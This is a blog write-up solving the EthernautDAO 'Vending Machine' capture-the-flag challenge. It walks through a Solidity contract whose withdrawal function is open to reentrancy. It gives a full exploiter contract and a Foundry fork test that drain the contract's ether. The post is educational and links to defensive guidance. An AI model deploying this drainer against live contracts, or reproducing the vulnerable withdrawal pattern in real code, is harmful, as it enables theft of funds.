---
title: 'EthernautDAO CTF — Vending Machine Solution'
excerpt: ΞthernautDAO is common goods DAO aimed at transforming developers into Ethereum developers. </br></br>The goal is to drain all the balance from the contract.
coverImage:
  url: '/assets/blog/ethernautdao.jpeg'
  credit:
    name: ΞthernautDAO
    url: https://twitter.com/EthernautDAO
date: '2022-07-26T09:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernautdao.jpeg'
---

[ΞthernautDAO](https://twitter.com/EthernautDAO) is common goods DAO aimed at transforming developers into Ethereum developers.

They started releasing CTF challenges on Twitter, so how couldn't I start solving them?

[https://twitter.com/EthernautDAO/status/1551211568926425089](https://twitter.com/EthernautDAO/status/1551211568926425089)

## CTF 4: Vending Machine

For this challenge, we have to deal only with a single Smart Contract called [VendingMachine](https://goerli.etherscan.io/address/0x00f4b86F1aa30a7434774f6Bc3CEe6435aE78174), a simple contract that models after a vending machine that provides only peanuts

At deployment time the contract is funded with `1 Ether` and our goal is to drain it from the whole balance.

## Study the contracts

Let's start reviewing all the contracts code. The code is pretty big, but I will only describe those functions that are interesting to us.

### `constructor`

```solidity
constructor() payable {
    require(msg.value >= 1 ether, "You need a minimum of reserve of 1 ether before deploying the contract");

    owner = msg.sender;
    reserve = msg.value;
    peanuts[address(this)] = 2000;
    txCheckLock = false;
}
```

When the contract is deployed the `msg.sender` is set as the owner of the contract, the `reserve` variable is initialized with the amount of `ether` sent, the `txCheckLock` is initialized to `false` and the `peanuts` mapping is updated giving the contract itself `2000` peanuts.

Nothing special here, we are just interested to know that at deploy time there's at least `1 ether` in the contract's balance.

### `isStillValid` function modifier

```solidity
modifier isStillValid() {
    require(!txCheckLock, "Sorry, this product project has been hacked");
    _;
}
```

This function modifier, used almost everywhere, will just revert if the contract has been already hacked by someone

### `isExtContract(address _addr)`

```solidity
function isExtContract(address _addr) private view returns (bool) {
    uint32 _codeSize;
    assembly {
        _codeSize := extcodesize(_addr)
    }
    return (_codeSize > 0 || _addr != tx.origin);
}
```

The idea behind this function is that it will return true if the `_addr` address is a contract.
The function determines if the `_addr` is a contract if one of these two requirements is met:

- the size of the `code` field of the address is greater than `0`. If you want to know more about how this opcode work, go over [EXTCODESIZE opcode](https://www.evm.codes/#3b) documentation
- the `_addr` is not equal to the `tx.origin`

Why is **crucial** to not only rely on the code size? Because when a contract is deployed and the `creator` is executed, the `extcodesize(address)` would return `0`.
An interesting read about this topic is [Deconstructing a Solidity Contract — Part II: Creation vs. Runtime](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/).

### `deposit` function

```solidity
function deposit() public payable isStillValid {
    require(msg.value >= 0.1 ether, "You must have at least 0.1 ether to initiate transaction");
    consumersDeposit[msg.sender] += msg.value;
}
```

Allow the user to deposit at least `0.1 ether` to the contract. The user balance is tracked by the `consumersDeposit` mapping variable.

### `withdrawal` function

```solidity
function withdrawal() public isStillValid {
    uint256 contractBalanceBeforeTX = getContractBalance();
    uint256 balance = consumersDeposit[msg.sender];
    uint256 finalContractBalance = contractBalanceBeforeTX - balance;

    require(balance > 0, "Insufficient balance");

    (bool sent, ) = msg.sender.call{value: balance}("");
    require(sent, "Failed to send ether");

    consumersDeposit[msg.sender] = 0;

    uint256 contractBalanceAfterTX = getContractBalance();

    if ((contractBalanceAfterTX < finalContractBalance) && isExtContract(msg.sender)) {
        txCheckLock = true;
    }
}
```

This is the most interesting and problematic function of the whole contract.
The purpose of this function is to allow the `msg.sender` to withdraw the whole balance he/she has accumulated via the `deposit` function.

> **Note:** All the variables and the last check are only important to track if the contract has been hacked or not and to not allow other auditors to submit a second solution, they are not important for this article scope.

Did you spot the **huge red flag** in the function?

The function implementation is not following the [Use the Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) allowing the `msg.sender` a way to re-enter the `withdrawl` function and keep withdrawing until the contract is completely drained.

### The attack

To leverage the reentrancy exploit of the `withdrawal` function, we need to deploy a contract that will re-enter the function when the `VendingMachine` send the funds calling the contract's `receive` function.

```solidity
contract VendingMachineExploiter {
    address private owner;
    VendingMachine private victim;
    bool private done = false;

    constructor(VendingMachine _victim) payable {
        // init
        owner = msg.sender;
        victim = _victim;

        // deposit the minimum amount we need to be able to start the attack
        victim.deposit{value: msg.value}();
    }

    function exploit() external {
        // Start the attack
        victim.withdrawal();
    }

    function withdraw() external {
        // Withdraw all the funds in the contract
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send ether");
    }

    receive() external payable {
        // The receive function will be called by the `VendingMachine.withdrawal` function
        // And we use it to re-enter into it until we have drained all the funds
        if (address(victim).balance != 0) {
            victim.withdrawal();
        }
    }
}
```

Before moving on, I would like to explain something. It's important to understand that you **must** deposit a **specific amount** to make it work correctly.

The `withdrawal` function will always withdraw the whole balance you have deposited via the `deposit` function.

This mean that if the balance of the `VendingMachine` contract **before** your deposit is `X Ether` you must deposit `X Ether` or an amount that is divisible by that `X`.

Let's make an example. Inside the `VendingMachine` there is `10 ether`

- if you deposit `10 ether` you will need to call `withdrawal` two times. One to withdraw your deposit, one to withdraw the `VendingMachine` balance
- if you deposit `1 ether` you will have to call `withdrawl` eleven times. One to withdraw your deposit and then `10 more times` to withdraw the rest of the balance
- if you deposit `11 ether` the contract will withdraw your `11 ether` but it will also try to re-enter and withdraw the same amount. The transaction will fail because the contract only have `10 ether` in its balance right now

So, the solution is to

- If you have enough funds, deposit the same amount of `ether` to match the contract balance. It will cost less gas because you will only call the `withdrawal` two times
- otherwise deposit an amount that still allows you to complete the challenge but prevent you to not revert because of the `Out of Gas` exception

## Solution code

Now what we have to do is:

- Create an Alchemy or Infura account to be able to fork the Goerli blockchain
- Choose a good block from which we can create a fork. Any block after the creation of the contract will be good
- Run a foundry test that will use the fork to execute the test

Here's the code that I used for the test:

```solidity
function testDrainVendingMachine() public {
    address player = users[0];
    vm.startPrank(player);

    uint256 initialPlayerBalance = player.balance;
    uint256 initialVendingMachineBalance = address(vendingMachine).balance;

    // deploy the VendingMachineExploiter contract
    VendingMachineExploiter exploiter = new VendingMachineExploiter{value: 0.1 ether}(vendingMachine);
    vm.label(address(exploiter), "VendingMachineExploiter");

    // start the exploit process
    exploiter.exploit();

    // send back all the funds to the player
    exploiter.withdraw();

    vm.stopPrank();

    // Assert that we have drained the `VendingMachine` contract
    assertEq(player.balance, initialPlayerBalance + initialVendingMachineBalance);
    assertEq(address(vendingMachine).balance, 0 ether);
}
```

Here is the command I have used to run the test: `forge test --match-contract VendingMachineTest --fork-url <your_rpc_url> --fork-block-number 7235687 -vv`

Just remember to replace `<your_rpc_url>` with the RPC URL you got from Alchemy or Infura.

You can read the full solution of the challenge, opening [VendingMachine.t.sol](https://github.com/StErMi/ethernautdao-ctf/blob/main/test/VendingMachine.t.sol)

## Further reading

- [EXTCODESIZE opcode](https://www.evm.codes/#3b)
- [Deconstructing a Solidity Contract — Part II: Creation vs. Runtime](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/)
- [Solidity Docs: Use the Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [Consensys: Ethereum Smart Contract Best Practices - Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
